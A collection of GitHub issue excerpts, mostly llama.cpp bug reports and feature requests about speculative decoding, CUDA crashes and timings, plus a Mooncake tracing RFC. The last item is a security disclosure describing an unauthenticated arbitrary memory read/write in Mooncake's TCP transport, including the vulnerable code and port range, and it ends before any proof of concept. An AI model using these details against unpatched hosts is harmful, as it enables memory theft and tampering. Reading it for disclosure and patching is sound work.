Vulkan

### Hardware

`Vulkan0: Intel(R) Arc(tm) B390 (PTL) (47829 MiB)` — integrated, unified memory.

### Models

**Target:** `google/gemma-4-26B-A4B-it-qat-q4_0-gguf` — Google's own QAT q4_0 GGUF,
unmodified. Verified byte-identical to the published file
(`sha256 3eca3b8f6d7baf218a7dd6bba5fb59a56ee25fe2d567b6f5f589b4f697eca51d`).

**Drafter:** `unsloth/gemma-4-26B-A4B-it-GGUF/MTP/mtp-gemma-4-26B-A4B-it-Q8_0.gguf`,
`--spec-type draft-mtp`. Google publishes the drafter only as safetensors
(`google/gemma-4-26B-A4B-it-assistant`, plus a QAT-matched
`google/gemma-4-26B-A4B-it-qat-q4_0-unquantized-assistant`); neither of their GGUF repos
ships a drafter, so any GGUF drafter is necessarily a third-party conversion. Acceptance
was healthy in the repro below (`draft_n_accepted=14` of `draft_n=24`), i.e. the drafter
is working normally.

The model pairing is incidental. The affected code is the generic speculative accept
path in `tools/server/server-context.cpp`; it runs after verification and never inspects
weights, tensor layout, or spec type, so every `--spec-type` and every target/drafter
pair should be affected. The A/B below is the same binary and the same request with only
the two drafter flags removed.

### Problem description & steps to reproduce

With speculative decoding enabled, `llama-server` returns `logprob: 0.0` (i.e. p = 1.0)
for **every** generated token, and an empty `top_logprobs` array. The values are
**silently wrong rather than absent** — the fields are present and well-formed.

Start the server with a drafter:

```
llama-server -m gemma-4-26B_q4_0-it-QAT.gguf \
  --spec-draft-model mtp-gemma-4-26B-A4B-it-Q8_0.gguf --spec-type draft-mtp \
  -ngl 999 --ctx-size 8192 -np 1 --cont-batching --jinja
```

then ask for logprobs:

```
curl -s http://127.0.0.1:8080/v1/chat/completions -H 'Content-Type: application/json' -d '{
  "model":"local",
  "messages":[{"role":"user","content":"Explain how a CPU branch predictor works."}],
  "max_tokens":24, "temperature":1.0, "logprobs":true, "top_logprobs":3}'
```

**With `--spec-draft-model` / `--spec-type draft-mtp` (23 of 24 tokens are exactly 0.0):**

```
'<|channel>'  logprob=-1.4305124977909145e-06  top_logprobs=[('<|channel>', -1.43e-06), ('thought', -14.67), ('s', -15.75)]
'thought'     logprob=0.0                      top_logprobs=[]
'\n\n'        logprob=0.0                      top_logprobs=[]
'*'           logprob=0.0                      top_logprobs=[]
'   '         logprob=0.0                      top_logprobs=[]
'*'           logprob=0.0                      top_logprobs=[]
'Target'      logprob=0.0                      top_logprobs=[]
':*'          logprob=0.0                      top_logprobs=[]
timings: predicted_n=24  draft_n=24  draft_n_accepted=14
```

**Same server, same request, drafter flags removed (0 of 24 are 0.0):**

```
'<|channel>'  logprob=-1.4305124977909145e-06   3 top_logprobs
'thought'     logprob=-7.271793037944008e-06    3 top_logprobs
'\n'          logprob=-0.7207118272781372       3 top_logprobs
'CPU'         logprob=-0.0010869447141885757    3 top_logprobs
' Branch'     logprob=-0.001078710425645113     3 top_logprobs
' Predict'    logprob=-0.000901389925274998     3 top_logprobs
'or'          logprob=-0.003622648539021611     3 top_logprobs
'.'           logprob=-0.06013880670070648      3 top_logprobs
```

Only the very first token is correct in the drafted arm, and only because it is sampled
before any draft exists, so it goes through the ordinary path.

### Cause

`populate_token_probs()` is the only writer of a real `result.prob`. The
non-speculative path sets a placeholder and then overwrites it
([server-context.cpp#L3849-L3856](https://github.com/ggml-org/llama.cpp/blob/3173a56471c1753650cd806694145ffd6dcace67/tools/server/server-context.cpp#L3849-L3856)):

```cpp
result.prob = 1.0f; // TODO: set it here instead of doing inside populate_token_probs

if (slot.task->params.sampling.n_probs > 0) {
    populate_token_probs(slot, result, slot.task->params.post_sampling_probs, params_base.special, tok_idx);
}
```

The speculative "main model sample and accept" path sets the same placeholder and never
calls it
([server-context.cpp#L3974-L3980](https://github.com/ggml-org/llama.cpp/blob/3173a56471c1753650cd806694145ffd6dcace67/tools/server/server-context.cpp#L3974-L3980)):

```cpp
result.prob = 1.0f; // set later

// TODO: set result.probs
```

So the placeholder is what gets serialised: `logprob = log(1.0) = 0`, and
`result.probs` stays empty, hence `top_logprobs: []`. This affects every token in the
accepted run, including the final target-sampled one — not only accepted draft tokens.

`git blame` puts `// TODO: set result.probs` at or before ab49f094d (the Nov 2025 move of
server-context into its own file), so it predates that refactor.

### Why this seems worth fixing rather than documenting

Absent logprobs are detectable by a caller; wrong ones are not. Anything that scores,
gates, or compares on logprobs — KLD/perplexity harnesses, confidence thresholds,
self-consistency ranking, quantisation comparisons — reads p = 1.0 and concludes the
model is maximally confident.

For a concrete case: I was testing whether `draft-mtp` biases the sampled distribution.
Mean logprob over 200 samples x 128 tokens came back **-0.00107 with MTP** against
**-

items.title: Whole-host hard lock during MTP draft catch-up prefill on multi-GPU tensor-split (b9745+)
items.author: taylorsatula
items.body_excerpt:
## Summary

Whole-host hard lock (requiring power cycle) during long-prompt prefill (100k+ tokens) when MTP speculative decoding is enabled on multi-GPU tensor-split configurations. MTP-off completes identical requests without issue (~295 s).

Root cause: MTP draft catch-up queues two GPU graphs against the same mutable KV cache without waiting for either to finish. Under prolonged tensor-split prefill, the overlapping work hits a dependency error inside the CUDA/meta backend and at least one GPU enters a non-completing kernel.

**The exact defective CUDA event or tensor-meta dependency below the MTP layer remains unidentified.** The fix serialized MTP ubatches at the application level; a backend fix may eventually permit safe asynchronous overlap again.

## Hardware

- CPU: AMD Ryzen 7 9800X3D
- RAM: 30 GiB + 16 GiB zram swap
- GPUs: 2× NVIDIA RTX 3090 (24 GiB each), PCIe Gen4 x8 bifurcation
- Driver: NVIDIA 595.84
- No CUDA P2P peer access; cross-GPU transfers use non-P2P behavior

## Model

Any Qwen3.5/3.6 architecture model with MTP (NextN) layers. Reproduced with:
- `Qwopus3.6-27B-Fusion-Q5_K_M.gguf`

This is not model-specific. The trigger is the MTP draft catch-up path, not a particular model's MTP head.

## Reproduction

**Build:** llama.cpp b9745 (bug present since MTP support added in PR #22673)

**Server command:**
```bash
llama-server \
    --model Qwopus3.6-27B-Fusion-Q5_K_M.gguf \
    --n-gpu-layers 999 \
    --split-mode tensor \
    --tensor-split 12,12 \
    --ctx-size 262144 \
    --parallel 1 \
    --flash-attn on \
    --batch-size 2048 \
    --ubatch-size 1024 \
    --cache-type-k q8_0 \
    --cache-type-v q8_0 \
    --spec-type draft-mtp \
    --spec-draft-n-max 3 \
    --spec-draft-type-k f16 \
    --spec-draft-type-v f16
```

**Trigger:** Send a single completion request with a 100k+ token prompt. The host locks within a short period. Failure position varies from ~78k to ~143k tokens with no deterministic boundary.

```bash
curl http://127.0.0.1:8080/completion \
  -H "Content-Type: application/json" \
  -d '{"prompt": "<100k+ tokens>", "n_predict": 1, "cache_prompt": false, "temperature": 0.0}'
```

**Expected:** HTTP 200 with completion.
**Actual:** Whole-host hard lock. GPU enters non-completing kernel. System requires power cycle. No error logged — the host is frozen.

## Causal isolation

1. **MTP-off control:** Same requests complete fine (~295 s). The failure only occurs with MTP active.
2. **Synchronize after catch-up:** Adding `llama_synchronize(ctx_dft)` after the catch-up call moves the wedge into the draft context — confirming the failing work is in the MTP draft, not the target.
3. **Both ubatches report success before GPU completion:** `CTX-COMPUTE-EXIT status=0` and `AR-EXIT ok=1` are logged for both ubatches, but the API accepts queued work without waiting for GPU completion. The overlap has already occurred by the time any post-hoc sync runs.
4. **Per-ubatch serialization fixes it:** Synchronizing after each internal MTP ubatch (no callback, normal graph UID reuse) completed 3/3 ~184k-token requests, zero failures.
5. **Terminal-only callback also fixes it:** A callback at terminal `result_output` (no interior graph cut) also succeeds, proving K/V or attention boundary segmentation is not required — serialization alone is sufficient.

## What does NOT explain it

- Disabling CUDA graphs — did not prevent the wedge
- Switching to fallback/butterfly allreduce — did not prevent the wedge
- Disabling ASPM L1 — did not prevent the wedge
- Reverting kernel 7.0.0-29 → 7.0.0-28 — did not prevent the wedge
- Memory and VRAM remained available throughout (no OOM)

These results narrow the failure to the ubatch overlap condition itself.

## When the bug was introduced

PR #22673 added `llama_decode(ctx_dft, batch)` for MTP catch-up on May 16, 2026 without synchronization between internally split ubatches. Short-context operations fit in one ubatch so they never triggered it. This workload guarantees multiple ubatches (2048 batch vs. 1024 ubatch).

## Proposed fix

Synchronize after each internal ubatch for MTP contexts:

```cpp
bool mtp_multi_ubatch = false;
do {
    const auto & ubatch = mctx->get_ubatch();
    // ... process ...
    bool has_next = mctx->next();
    mtp_multi_ubatch |= has_next;
    if (cparams.ctx_type == LLAMA_CONTEXT_TYPE_MTP && mtp_multi_ubatch) {
        synchronize();
    }
} while (has_next);
```

Only activates for MTP contexts with multiple ubatches. Target decode, non-MTP speculative decoding, and short MTP drafts pass through unchanged.

**PR:** #26827

## Related issues

- #23210 — llama-server crashes on CUDA with Qwen3.6-27B (same symptom cluster: Qwen3.6, CUDA, MTP, long-context prefill, multi-GPU, hard hangs)
- #26558 — different MTP crash (CUDA graph-cache growth, invalid cuBLAS stream); `GGML_CUDA_DISABLE_GRAPHS=1` did not fix this reproducer

## Additional data point

Single-GPU MTP (one RTX 3090, Qwen3.8-27B, -ub 1024, FA on) has not reproduced this — consistent with the multi-GPU tensor-split overlap being the trigger. See [comment from @47Hunter47](https://github.com/ggml-org/llama.cpp/pull/26827#issuecomment-5462117657).

An adjacent reproducer from @Anbeeld ([#27750](https://github.com/ggml-org/llama.cpp/issues/27750)) shows a related multi-GPU tensor-split instability with MTP **off**, suggesting the MTP overlap is one trigger for a deeper tensor-split/backend ordering or lifetime problem rather than the only way to reach it.

items.title: CUDA OOM hard-abort in ggml_cuda_op_top_k (argsort_f32_i32_cuda_cub temp alloc via ggml_cuda_pool_vmm / cuMemCreate) after long-running llama-server decode
items.author: gdevenyi
items.body_excerpt:
### Summary

`llama-server` hard-aborted (core dump) with a CUDA OOM inside `ggml_cuda_op_top_k` during a regular decode, after ~76 h of continuous serving. The failing allocation is a CUB radix-sort temporary buffer in `argsort_f32_i32_cuda_cub`, allocated from the VMM pool (`ggml_cuda_pool_vmm::alloc` → `cuMemCreate`). Instead of a recoverable error the process is killed via `ggml_cuda_error` → `ggml_abort`.

### Name and Version

```
version: 0.3.0-dev (build 10788, commit e107984bc)
built with IntelLLVM 2026.0.0 for Linux x86_64
```

### Operating systems / hardware

- OS: CachyOS (Arch), kernel 7.1.8-1-cachyos, x86_64
- GPU: NVIDIA GeForce GTX 1080 Ti, 11 GB (Pascal, sm_61)
- Driver 580.173.02, CUDA 13.0, VMM allocator (`ggml_cuda_pool_vmm`)

### Command line

```
/opt/llama.cpp/bin/llama-server -lv 4 -hf unsloth/Qwen3.8-Flash-Next-GGUF:UD-Q3_K_XL \
  --spec-default --no-mmproj-offload --fit on --fit-ctx 262144 --fit-target 128 \
  --threads 16 --flash-attn on --jinja --host 0.0.0.0 --port 8080 --no-mmap \
  -ctv q8_0 -ctk q8_0 --reasoning-preserve -np 1 --temp 1.0 --top-p 0.95 \
  --top-k 20 --min-p 0.0 --kv-unified
```

### What happened

After ~76 h uptime (task 9748, slot 0 with 16733 cached tokens), a decode triggered the CUDA `top_k` op, which took the CUB argsort fallback path (bitonic is only used when `ncols <= 1024` and the row fits in shared memory, `ggml/src/ggml-cuda/top-k.cu:240`). `argsort_f32_i32_cuda_cub` then requested its temporaries (`ncols*nrows` int indices + `ncols*nrows` float keys + CUB temp storage, chunked to ~64 MB of rows) from the VMM pool, which could not grow (`cuMemCreate` OOM) and aborted the whole server:

```
75.47.584.835 I slot   operator(): id  0 | task 9748 | cached n_tokens = 16733, memory_seq_rm [16733, end)
/home/gdevenyi/llama/llama.cpp/ggml/src/ggml-cuda/ggml-cuda.cu:108: CUDA error
76.06.477.026 E CUDA error: out of memory
76.06.477.036 E   current device: 0, in function alloc at /home/gdevenyi/llama/llama.cpp/ggml/src/ggml-cuda/ggml-cuda.cu:591
76.06.477.037 E   cuMemCreate(&handle, reserve_size, &prop, 0)
```

Backtrace (ggml crash handler / gdb):

```
#2  ggml_print_backtrace ()                                  libggml-base.so.0
#3  ggml_abort ()                                            libggml-base.so.0
#4  ggml_cuda_error(char const*, char const*, char const*, int, char const*)
#5  ggml_cuda_pool_vmm::alloc(unsigned long, unsigned long*) libggml-cuda.so.0
#6  argsort_f32_i32_cuda_cub(ggml_cuda_pool&, float const*, int*, int, int, ggml_sort_order, CUstream_st*)
#7  ggml_cuda_op_top_k(ggml_backend_cuda_context&, ggml_tensor*)
#8  ggml_backend_cuda_graph_compute(ggml_backend*, ggml_cgraph*)
#9  ggml_backend_sched_graph_compute_async ()
#10 llama_context::graph_compute(ggml_cgraph*, bool)
#11 llama_context::process_ubatch(llama_ubatch const&, llm_graph_type, llama_memory_context_i*, ggml_status&)
#12 llama_context::decode(llama_batch const&)
#13 llama_decode ()
#14 server_context_impl::decode(int&, int, llama_batch&)::{lambda()#1}
#15 server_queue::yield_to_queue(std::function<void ()>&&)
#16 server_context_impl::decode(int&, int, llama_batch&)
#17 server_context_impl::update_slots()
#18 server_queue::start_loop(long)
```

Process exits with `Aborted (core dumped)`.

### Expected behavior

An OOM in a per-op temporary allocation should surface as a recoverable error (e.g. `GGML_STATUS_ALLOC_FAILED`, server 503, context shift / KV eviction) instead of aborting the entire `llama-server` process via `ggml_abort`.

### Notes

- 11 GB card with `--fit on --fit-ctx 262144` and q8_0 KV cache: by the time of the crash the KV cache and weights occupied most of VRAM, so the VMM pool could not grow for the argsort temporaries.
- Possible directions: fall back to `cudaMalloc`/retry or fail gracefully when the VMM pool cannot grow; catch OOM from per-op temporaries in the backend/graph compute and propagate a status; reduce/chunk the CUB argsort temp footprint for wide `top_k`.
- Did not find an existing issue for this (`argsort`/`top_k`/`pool_vmm` OOM searched).

items.title: Feature Request: split generation timings into reasoning and answer phases (rate and draft acceptance per phase)
items.author: badbat75
items.body_excerpt:
### Prerequisites

- [ ] I am running the latest code. Development is rapid so there are no tagged versions as of now. (Tested on the latest release, **v0.5.0**, b11146, commit 7fe450e19; the relevant server code is unchanged on master as of 2026-09-24.)
- [x] I carefully followed the [README.md](https://github.com/ggml-org/llama.cpp/blob/master/README.md).
- [x] I searched using keywords relevant to my issue to make sure that I am creating a new issue that is not already open (or closed).
- [x] I reviewed the [Discussions](https://github.com/ggml-org/llama.cpp/discussions), and have a new and useful enhancement to share.

### Feature Description

Split the generation timings of a reasoning model into its two phases, reasoning and answer, in `llama-server`'s `timings` and in the `print_timing` log line.

Today `timings` reports one `predicted_n` / `predicted_ms` / `predicted_per_second`, plus one `draft_n` / `draft_n_accepted`, for the whole completion. With a reasoning model and speculative decoding those numbers average two workloads that behave very differently, so the single figure describes neither.

Proposed shape (names are only a suggestion), added next to the existing fields and emitted only when the response actually contained reasoning:

```json
"timings": {
  "predicted_n": 2048, "predicted_ms": 71416.1, "predicted_per_second": 28.66,
  "draft_n": 1902, "draft_n_accepted": 1412,
  "reasoning": {
    "predicted_n": 1825, "predicted_ms": 65216.3,
    "draft_n": 1737, "draft_n_accepted": 1247
  }
}
```

The answer phase is then the difference, so one extra object is enough. The `print_timing` line at the end of a request could carry the same split (`reasoning: 1825 tokens, 28.0 t/s, acc 72% | answer: 223 tokens, 35.6 t/s, acc 100%`).

### Motivation

We tune `--spec-draft-n-max` and pick quants from benchmarks, and a reasoning model's mean decode rate is the wrong number to tune on: how much of the output is reasoning moves with the question, and in agentic coding the reasoning phase is usually most of it.

Measured on llama.cpp v0.5.0 (b11146), Qwen3.8-27B Q8_0 on an R9700 (ROCm) + RTX 4070 SUPER (CUDA) split, DFlash2 drafter, `temperature 0`, 2048 output tokens, 93.6k-token prompt, 3 repetitions each (the split was obtained client-side, see below):

| drafter | reasoning t/s | reasoning acc | answer t/s | answer acc | whole request t/s |
|---|---:|---:|---:|---:|---:|
| none | 13.0 | | 12.9 | | 13.0 |
| DFlash2, n-max 3 | 28.0 (1825 tok) | 72% | 35.6 (223 tok) | 100% | 28.7 |
| DFlash2, n-max 7 | 33.7 (2048 tok) | 51% | (not reached) | | 33.6 |

- The answer drafts at 100% acceptance and is capped by `n-max` itself; the reasoning drafts at 51 to 72%. Their mean is a regime that does not exist.
- The phase share also changes between otherwise identical runs: at `temperature 0` the n-max 5 and 7 runs reasoned past the 2048-token cap while n-max 3 answered at token 1825, so two "decode" means compared naively mix different phase proportions.
- In the server log the phase change is visible as a step in `tg_3s` (about 22 t/s during reasoning, about 40 t/s once the answer starts, on a request with a longer answer), but nothing in the timings says where it happened.

The count alone (#27971, `completion_tokens_details.reasoning_tokens`, closed by its author) would not be enough for this: the rate and the draft acceptance per phase need the time and the draft counters at the boundary.

### Possible Implementation

We currently get this client-side: stream with `"timings_per_token": true`, and read the cumulative `timings` on the last event whose delta is `reasoning_content`; each phase is a difference of the server's own counters, with no client clock. That works, but it needs streaming and per-token timings on every event, and any client that does not stream cannot get it.

Server-side, the boundary is already known at generation time in two places:

- `task_result_state::update_chat_msg` (tools/server/server-task.cpp) separates `reasoning_content` from `content` incrementally while streaming;
- the `reasoning-budget` sampler (common/reasoning-budget.cpp) tracks the reasoning block token by token (`REASONING_BUDGET_COUNTING` to `REASONING_BUDGET_DONE`), but only when a budget is set.

A snapshot of `server_slot_stats` (`n_gen`, `t_gen_last`, `n_draft_tokens`, `n_draft_accepted`) taken when the first non-reasoning token is emitted would give the `reasoning` object above; tokens of one speculative step share one timestamp, so step granularity is the natural precision.

Happy to test a PR on ROCm (gfx1201) + CUDA.

items.title: old NVIDIA GPU arch run(Fermi,Kepler) support, and LLVM-IR NVPTX(Clang) compiler support
items.author: 6uO
items.body_excerpt:
## TL;DR

DOWNLOAD: [ggml-0.25.3_patch.zip](https://github.com/user-attachments/files/33023040/ggml-0.25.3_patch.zip), compile target CUDA Toolkit 8.0+sm_20.
:warning:running requirements installed CUDA Toolkit 8.0 and Visual C++ v14 Redistributable:warning:

old nvcc unsupport C++ 17 host compiler, so use LLVM-IR NVPTX(-DCMAKE_CUDA_COMPILER=clang) compiler support

> Thx very much \<LLVM Project\> and \<Kitware CMake\> always keep compatibility with the old NVIDIA architecture :-)

Welcome to discuss how to improve the patch.
Hope to Merge the patch to the repository, can also filter a portion of the diff to apply the patch. (I am sorry for not complying [CONTRIBUTING.md](https://github.com/ggml-org/llama.cpp/blob/master/CONTRIBUTING.md), because there is an issue with the GitHub account.)
> I will try my best to improve the patch quality until the Collaborators and Maintainers agree to merge it.

## Aboot

__Purpose:__

1. To adapt to the increasingly expensive GPU era, adapt to cheap NVIDIA GPUs, and lower the minimum running requirements for ggml-cuda

2. Anyone can run inference at a very low cost.

3. Expand the user base and attract more contributors.

__Content:__

1. Quality Optimization/Bug Fixes.

2. Extensively used the `#if CUDART_VERSION > 8000` macro to handle legacy syntax, in order to maintain compatibility with Fermi architecture.

> The added feature can ignore compatibility with the legacy `__CUDA_ARCH__` / `CUDART_VERSION`, because I don't want to impose coding burden on others.

5. The code comment containing `unconfirmed patch:` means I don't know what to do.

6. Specially handle code that does not support LLVM-IR NVPTX using the `__NVCC__` macro.

7. The code comment containing a small part of `TODO` and AI-generated code `AI code`.

## Build

In order to build ggml-cuda, you need the following support libraries and
tools:

* Git (patch folder)
* CMake >= 3.18
* Latest released version of LLVM & Clang (-DCMAKE_CUDA_COMPILER=clang)
* GNU make or Ninja
* CUDA Toolkit

Download [ggml](https://github.com/ggml-org/ggml/archive/refs/tags/v0.25.3.zip)
extract ggml-0.25.3
```
patch -p1 -d ggml-0.25.3 < ggml-0.25.3.patch
cmake -DGGML_CUDA=ON -G Ninja -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang -DCMAKE_CUDA_COMPILER=clang -DCMAKE_CUDA_HOST_COMPILER=clang -DCMAKE_C_COMPILER_FORCED=ON -DCMAKE_CXX_COMPILER_FORCED=ON -DCMAKE_CUDA_COMPILER_FORCED=ON
```

### Notes

1. The final CUDA Driver API supported by the Kepler architecture is 11.4, but the final CUDA Toolkit supported by the Kepler architecture is 11.8, so therefore running (ggml-cuda for sm_35) with CUDA Toolkit 11.8 may have bug.

2. The Fermi architecture lacks the `__shfl` instruction, so logical errors may occur when using it.

3. For Multi-GPU setups, it is not recommended to rely on NVIDIA SLI for acceleration.

4. If `USE_GRAPHS = 1`, `CUDA : ARCHS` must include the sm of the current GPU? and `GGML_CUDA_DISABLE_GRAPHS` env var is broken?
   
   > ggml_cuda_compute_forward: IM2COL failed
   > CUDA error: no kernel image is available for execution on the device
   >   current device: 0, in function ggml_cuda_compute_forward at ggml-0.25.3/ggml/src/ggml-cuda/ggml-cuda.cu:2436

5. sm_75 device(20 Series) use CUDA Toolkit 11.8 build and run:

items.body_excerpt:
### Name and Version

Commit: `7fe450e19305b828c199d602c23a8337aaa1f03b`.

```console
version: 0.5.0-dev (build 11146, commit 7fe450e19)
built with AppleClang 21.0.0.21000101 for Darwin arm64
```

CPU build:

```sh
cmake -B build -DGGML_METAL=OFF -DGGML_BLAS=OFF -DLLAMA_CURL=OFF -DLLAMA_OPENSSL=OFF -DCMAKE_BUILD_TYPE=Release
cmake --build build --target llama-speculative llama-server
```

### Operating systems

Mac, Linux

macOS 27.0; the existing Linux reproduction used Ubuntu 24.04 and gcc 13.3.

### GGML backends

CPU

### Hardware

Apple M1 Pro. The existing Linux results used Intel Xeon CPUs at 2.10 GHz and 2.80 GHz.

### Models

Tiny random Llama target and a noised copy as draft: F32, 2 layers, vocabulary size 8. Each GGUF is 24,064 bytes. The vocabulary is `a` through `h`, with EOS at `h` (id 7). The prompt `bcdbc` is ids `1,2,3,1,2`.

The self-contained archive below has both models and `repro_l3.py`.

### Problem description & steps to reproduce

`llama-speculative` changes the output distribution at temperature greater than zero, even with `-np 1`.

On this fixture, after a first generated token of `f`, the next token is always `e`. The target's non-speculative distribution at that prefix gives `e` only about 0.345 probability, with the remaining mass on `g` and `h`.

Decode the archive below in the llama.cpp checkout, then run:

```sh
python3 repro_l3.py build/bin/llama-speculative target.gguf draft.gguf 1000
```

The script uses seeds 1 through 1000 and counts the token after a first generated `f`. It uses this command for each seed:

```sh
build/bin/llama-speculative -m target.gguf -md draft.gguf -p bcdbc -n 4 --spec-draft-n-max 3 \
  -c 64 -t 1 --cache-type-k f32 --cache-type-v f32 -fa off \
  --samplers 'penalties;top_k;top_p;min_p;temperature' -np 1 \
  --temp 1.0 --top-k 3 --top-p 1.0 --min-p 0.0 --repeat-penalty 1.0 --repeat-last-n 64 -s 11
```

The reference probabilities come from non-speculative `llama-server` with prompt `bcdbcf`, the same sampler settings, `n_probs=8`, and `post_sampling_probs=true`: `e=0.3454894722`, `g=0.4516915679`, `h=0.2028189600`.

Two parts of the example seem to explain the result:

- It samples the draft, sorts its candidates, then takes `cur_p->data[is].id`. With `-np 1`, that is the top candidate, rather than the sampled candidate stored in `selected`. Verification still uses the ratio test with the draft probability.
- On rejection, it sorts the target and draft candidates by token id and subtracts probabilities by array position. With top-k/top-p/min-p truncation, the two arrays can contain different token ids at the same position.

Both lines remain in source at `a3a1c4747fdc0dcad40b3946108b89375d9a7d0e`: [draft selection](https://github.com/ggml-org/llama.cpp/blob/a3a1c4747fdc0dcad40b3946108b89375d9a7d0e/examples/speculative/speculative.cpp#L570) and [residual subtraction](https://github.com/ggml-org/llama.cpp/blob/a3a1c4747fdc0dcad40b3946108b89375d9a7d0e/examples/speculative/speculative.cpp#L346). That is a source check; the runtime reproduction above is on the pinned build.

This report concerns `examples/speculative`, rather than the server paths changed by #27694.

### First Bad Commit

Not bisected.

### Relevant log output

Fresh Mac run:

```console
seeds 1..1000; runs with first token 'f' (5): 819
  next token 4 ('e'): 1.000   target: 0.345
  next token 6 ('g'): 0.000   target: 0.452
  next token 7 ('h'): 0.000   target: 0.203
```

The saved earlier run had 820 qualifying seeds, with the same next-token frequencies. The script retries the same seed when the example's stdout is incomplete.

AI assistance: Codex prepared this report from the existing reproduction kit and reran the Mac checks.

python3 -c "import base64,pathlib; pathlib.Path('repro.zip').write_bytes(base64.b64decode(pathlib.Path('repro.zip.b64').read_text()))"
python3 -m zipfile -e repro.zip .

items.title: [RFC]: End-to-End Transfer Tracing for Mooncake
items.author: llfl
items.body_excerpt:
### Changes proposed

## Summary

  This RFC proposes a unified tracing architecture for Mooncake transfer execution.

  The design introduces a reusable tracing subsystem and applies it across the transfer path so a single
  logical transfer can be observed across:

  - store-facing orchestration
  - transfer-engine batch management
  - multi-transport task submission
  - per-slice data-plane execution
  - terminal completion / failure / timeout reporting

  The result is a structurally consistent trace tree that supports both live debugging and offline postmortem
  analysis.

  ---

  ## Motivation

  Mooncake transfer workflows cross several layers, but observability has historically been fragmented. Logs
  and metrics can show symptoms, but they do not preserve causality.

  This creates recurring problems:

  - latency attribution is ambiguous
  - control-plane and data-plane delays are hard to separate
  - timeout root cause is difficult to localize
  - store-level operations and transfer-engine execution are not naturally correlated
  - external systems cannot reliably ingest or reconstruct transfer timelines

  We need tracing that preserves parent-child relationships across the full transfer lifecycle, not just
  isolated spans emitted by individual modules.

  ---

  ## Goals

  - Provide a common tracing substrate for Mooncake components
  - Preserve trace continuity across store, transfer engine, and transport layers
  - Model transfer execution with stable, explicit span hierarchy
  - Export traces to local files and OTLP collectors
  - Support async export with retry and spool behavior
  - Improve trace completeness for failure and timeout cases
  - Make offline investigation possible from raw JSONL outputs

  ## Non-goals

  - Redesign transfer scheduling or transport selection
  - Replace existing metrics or logs
  - Guarantee zero-overhead tracing on hot paths
  - Fully redesign all observability ownership boundaries in one patch
  - Solve every TENT-specific tracing gap in this RFC

  ---

  ## Background

  A Mooncake transfer is not a single function call. It is a lifecycle:

  1. a store-side operation decides how to move data
  2. transfer-engine allocates and manages a batch
  3. multi-transport selects concrete transports
  4. transports submit slice-level work
  5. status polling eventually determines terminal state

  Without explicit trace propagation, each stage can emit useful local signals while the global story remains
  invisible.

  The core design principle of this RFC is:

  **Make the lifecycle first-class.**
  Do not infer it from logs after the fact.

  ---

  ## Proposal

  ### 1. Introduce `mooncake-tracing`

  Add a dedicated tracing module that provides:

  - `TraceContext`
  - `TraceCarrier`
  - `TraceRecord`
  - `TracingFacade`
  - RAII-style `Span`
  - configurable sampling
  - pluggable exporters

  This module becomes the single place where trace creation, parenting, export, and sampling behavior live.

  ### 2. Define a stable transfer span hierarchy

  The proposed hierarchy is:

  - `mooncake.transfer.operation`
    - `mooncake.transfer.submit_gap`
    - `te.batch`
      - `te.batch.submit`
        - `te.task.submit`
          - slice events
      - `te.batch.execute`
      - `te.task.status`
      - `te.batch.status`
    - `mooncake.transfer.wait_completion`
    - `mooncake.transfer.complete`

  This hierarchy captures both:
  - the user-visible transfer operation lifecycle
  - the internal execution lifecycle inside the transfer engine

  ### 3. Support parent context propagation

  When an upstream trace context exists, Mooncake should attach to it.
  When no parent exists, Mooncake should create its own operation root.

  This allows Mooncake transfers to participate in larger distributed traces while still remaining self-
  contained when invoked directly.

  ### 4. Keep batch-level tracing alive until terminal state

  A short-lived submit-only span is insufficient because a transfer can spend most of its time after
  submission.

  The batch root span must survive until terminal completion, failure, cancellation, or timeout.
  A separate persistent execution span (`te.batch.execute`) captures the data-plane lifetime.

  ### 5. Add explicit task and slice tracing state

  `MultiTransport` maintains trace registry state for:

  - batch context
  - task context
  - transport name
  - slice queue state
  - slice terminal state
  - deduplicated terminal markers

  This avoids duplicate terminal events and lets status polling produce complete traces even when terminal
  evidence appears asynchronously.

  ### 6. Export traces through configurable backends

  Supported paths include:

  - in-memory exporter for tests
  - JSONL exporter for local/debug workflows
  - OTLP/HTTP exporter for collector integration
  - async remote exporter with:
    - queue limits
    - retry
    - local spool fallback

  ### 7. Provide offline trace aggregation

  An offline aggregator script merges JSONL outputs into a readable waterfall / phase report for postmortem
  analysis.

  This is especially useful when traces were produced locally or remote collection was unavailable.

  ---

  ## Detailed Design

  ### Store-side tracing

  Store transfer flows create a `TransferTraceSession` that:

  - creates a standalone root span if no parent exists
  - reuses the provided parent context when one exists
  - tracks submit-gap timing
  - creates a wait-completion span
  - records final completion status

  This ensures the store layer has a coherent operation-level narrative.

  ### Transfer-engine tracing

  `TransferEngineImpl` owns batch-lifecycle tracing semantics.

  It maintains active batch trace state and ensures:

  - one stable `te.batch` root per batch
  - one stable `te.batch.execute` span for data-plane lifetime
  - child operation spans for submit / notify / status actions
  - terminal closure at batch completion or release

items.title: [Bug]: Unauthenticated arbitrary memory read and write in Mooncake TCP transport data plane
items.author: yyymk
items.body_excerpt:
### Bug Report

### Summary

The TCP transport of mooncake-transfer-engine serves a raw memory access protocol on its data port without any authentication or address validation. Any host that can reach the port can read and write arbitrary memory of the engine process, including memory outside any registered buffer. Runtime-confirmed on mooncake-transfer-engine 0.3.11.post1. The fix in 0.3.13 (commit `a2933849417259e562fc9cbad63c618d464dfb2d`) added address validation against registered buffers. Suggested severity: High, CVSS 8.8.

### Details

`TcpTransport::install` (src/transport/tcp_transport/tcp_transport.cpp) opens a data listener via `findAvailableTcpPort`, which picks a random port from the documented default range 15000-17000 (`GlobalConfig::rpc_min_port`/`rpc_max_port` in include/config.h) and binds on all interfaces.

The server side of the protocol is `ServerSession`. The wire header is a plain C struct, not packed, so it is 24 bytes on the wire:

```cpp
struct SessionHeader {
    uint64_t size;
    uint64_t addr;
    uint8_t opcode;
};
```

In `ServerSession::readHeader` the address field from the network is used directly as a local pointer:

```cpp
local_buffer_ = (char*)(le64toh(header_.addr));
if (header_.opcode == (uint8_t)TransferRequest::WRITE)
    readBody();
else
    writeBody();
```

`readBody` receives `size` bytes from the socket into `addr + total_transferred_bytes_`. `writeBody` sends `size` bytes of process memory starting at `addr` back to the peer. There is no peer authentication, `addr`/`size` are never checked against the local segment descriptor's registered buffers, `size` is unbounded, and the connection is persistent, so several requests can be pipelined over one connection.

0.3.13 wires a `validateTcpAddress` callback into the session and rejects addresses outside registered buffers in both directions. That confines the primitive to registered memory; the port still has no peer authentication.

### PoC

